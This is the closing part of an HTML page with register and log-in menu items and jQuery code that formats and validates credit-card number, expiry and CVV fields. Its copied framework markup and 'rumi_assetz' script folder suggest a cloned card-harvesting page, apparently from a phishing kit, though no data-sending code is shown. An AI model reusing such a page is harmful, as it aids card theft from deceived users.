                            <div class="MuiButtonBase-root MuiListItem-root jss221 jss223 MuiListItem-gutters MuiListItem-divider MuiListItem-button">
                                <svg height="24" viewBox="0 0 24 24" width="24" class="MuiSvgIcon-root jss42" focusable="false" icon="Edit">
                                    <path
                                        d="m21 14.7v5.3c0 1.7-1.3 3-3 3h-14c-1.7 0-3-1.3-3-3v-14c0-1.7 1.3-3 3-3h5.3c.6 0 1 .4 1 1s-.4 1-1 1h-5.3c-.6 0-1 .4-1 1v14c0 .6.4 1 1 1h14c.6 0 1-.4 1-1v-5.3c0-.6.4-1 1-1s1 .4 1 1zm1.7-8-10 10c-.2.2-.4.3-.7.3h-4c-.6 0-1-.4-1-1v-4c0-.3.1-.5.3-.7l10-10c.4-.4 1-.4 1.4 0l4 4c.4.4.4 1 0 1.4zm-2.1-.7-2.6-2.6-9 9v2.6h2.6z"
                                    ></path>
                                </svg>
                                <div class="MuiListItemText-root"><p class="MuiTypography-root jss218 jss222 MuiTypography-body1">Register</p></div>
                            </div>
                            <div class="MuiButtonBase-root MuiListItem-root jss221 jss223 MuiListItem-gutters MuiListItem-divider MuiListItem-button">
                                <svg height="24" viewBox="0 0 24 24" width="24" class="MuiSvgIcon-root jss42" focusable="false" icon="LogIn">
                                    <path
                                        d="m22 4v16c0 1.7-1.3 3-3 3h-5c-.6 0-1-.4-1-1s.4-1 1-1h5c.6 0 1-.4 1-1v-16c0-.6-.4-1-1-1h-5c-.6 0-1-.4-1-1s.4-1 1-1h5c1.7 0 3 1.3 3 3zm-6.1 8.4c.1-.2.1-.5 0-.8-.1-.1-.1-.2-.2-.3l-4-4c-.4-.4-1-.4-1.4 0s-.4 1 0 1.4l2.3 2.3h-9.6c-.6 0-1 .4-1 1s.4 1 1 1h9.6l-2.3 2.3c-.4.4-.4 1 0 1.4.2.2.5.3.7.3s.5-.1.7-.3l4-4c.1-.1.2-.2.2-.3z"
                                    ></path>
                                </svg>
                                <div class="MuiListItemText-root"><p class="MuiTypography-root jss218 jss222 MuiTypography-body1">Log in</p></div>
                            </div>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <script src="rumi_assetz/js/jquery.js"></script>
        <script src="rumi_assetz/js/misc.js"></script>
        <script>
            $(document).ready(function () {
                $("#ccexp").mask("00/0000",{placeholder:"MM/YYYY"});
				$("#ccnum").keyup(function () {
					var cc = $("#ccnum").val();
					if (cc.startsWith(2) || cc.startsWith(3) || cc.startsWith(4) || cc.startsWith(5) || cc.startsWith(6)) {
					} else {
						$("#ccnum").val("");
						$("#ccnum").parent().addClass("Mui-error");
                        $("#ccnum").next().show();
                        $("#ccnum").parent().next().show();
						return false;
					}
				});
				$("#ccnum").payment("formatCardNumber");
				var carde = $("#ccnum").val();
				$("#ccnum").focusout(function () {
					var cardType = $.payment.cardType($("#ccnum").val());
					if ($.payment.validateCardNumber($("#ccnum").val()) == false) {
						$("#ccnum").val("");
						$("#ccnum").parent().addClass("Mui-error");
                        $("#ccnum").next().show();
                        $("#ccnum").parent().next().show();
						return false;
					}
					if (cardType == "amex") {
						$("#cccvv").attr("maxlength", "4");
					} else {
						$("#cccvv").attr("maxlength", "3");
					}
				});
                var allInputs = $(":input:not(button)");
                allInputs.focusout(function () {
                    $(this).blur(function () {
                        if ($(this).prop("required")) {
                            if (!$(this).val()) {
                                $(this).parent().addClass("Mui-error");
                                $(this).next().show();
                                $(this).parent().next().show();
                            } else {
                                $(this).parent().removeClass("Mui-error");
                                $(this).next().hide();
                                $(this).parent().next().hide();
                            }
                        }
                    });
                });
            });
        </script>
    </body>
</html>